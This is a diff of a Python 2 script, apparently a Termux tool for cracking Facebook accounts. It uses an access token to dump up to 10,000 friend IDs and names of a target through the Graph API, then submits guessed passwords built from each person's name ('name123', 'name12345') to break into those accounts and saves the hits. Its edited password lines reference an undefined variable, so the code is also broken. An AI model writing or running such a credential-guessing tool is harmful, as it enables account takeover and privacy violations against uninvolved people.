@@ -30,7 +30,7 @@ def jalan(z):
 def log_token():
 	os.system('clear')
 	print logo
-	data = raw_input("\n [•] Token: ")
+	data = raw_input("\nToken: ")
 	try:
 		me = requests.get('https://graph.facebook.com/me?access_token='+data)
 		open("token.txt",'w').write(data)
@@ -46,12 +46,12 @@ def publik():
 		time.sleep(0.01)
 		log_token()
 	try:
-		idt = raw_input(" [•] DUMP UID: ")
+		idt = raw_input("DUMP UID: ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
 		except KeyError:
-			print(' [•] UID Tidak Ada')
+			print('UID Tidak Ada')
 			time.sleep(0.2)
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(10000)&access_token="+toket)
@@ -62,16 +62,16 @@ def publik():
 		for a in z['friends']['data']:
 			id.append(a['id']+"<=>"+a['name'])
 			ys.write(a['id']+"<=>"+a['name']+'\n')
-		print("\r [•] Target %s UID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+		print("\rTarget %s UID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
 		ys.close()
-		raw_input("\n ENTER")
+		raw_input("\nENTER to CRACK")
 		__crack__().__brute__()
 	except Exception as e:
-		print(' [•] 0 Teman');time.sleep(3)
+		print('0 Teman');time.sleep(3)
 		menu()
 	except KeyError:
-		print(' [•] 0 Teman')
-		raw_input(' ENTER')
+		print('0 Teman')
+		raw_input('ENTER')
 		publik()
 
 class __crack__:
@@ -114,9 +114,9 @@ class __crack__:
                     uid, name = omen.split('<=>')
                     xz = name.split(' ')
                     if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
-                        pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                        pwx = [name, xz[0]+"123", x+"1234", x+"12345"]
                     else:
-                        pwx = [name, xz[0]+"123", xz[0]+"12345" ]
+                        pwx = [name, x+"123"]
                     __nemoXD__.submit(self.__api__, uid, pwx)
                 except:
                     pass
@@ -137,9 +137,9 @@ def rename():
         oldname = r"/data/data/com.termux/files/home/cpcok.txt"
         newname = r"/data/data/com.termux/files/home/hasil/cpcp" + onem + ".txt"
         shutil.move(oldname, newname)
-        print("\n DONE")
+        print("\nDONE")
     except (KeyError, IOError):
-        print("\n ZONK")
+        print("\nZONK")
     try:
         open("/data/data/com.termux/files/home/ok.txt","r")
         os.system("mv /data/data/com.termux/files/home/ok.txt /data/data/com.termux/files/home/okcok.txt")
@@ -147,30 +147,30 @@ def rename():
         oldname = r"/data/data/com.termux/files/home/okcok.txt"
         newname = r"/data/data/com.termux/files/home/hasil/okok" + onem + ".txt"
         shutil.move(oldname, newname)
-        print("\n DONE")
+        print("\nDONE")
     except (KeyError, IOError):
         pass
-    raw_input('\n ENTER to EXIT')
+    raw_input('\nENTER to EXIT')
     sys.exit()
 
 def menu():
     os.system("clear")
     print logo
-    print ('\n [1] Lanjut Crack')
-    print (' [2] Ganti Token\n')
-    mn = raw_input(" [•] Pilih : ")
+    print ('\n[1] Lanjut Crack')
+    print ('[2] Ganti Token\n')
+    mn = raw_input("[•] Pilih: ")
     if mn == "":
-        print (' goblok!')
+        print ('goblok!')
         menu()
     elif mn == "1" or mn == '01':
         publik()
     elif mn == "2" or mn == '02':
         os.system("rm -rf token.txt")
-        print (' [•] Token Dihapus')
+        print ('[•] Token Dihapus')
         time.sleep(1)
         log_token()
     else:
-        print (' goblok!')
+        print ('goblok!')
         menu()
 
 if __name__=='__main__':
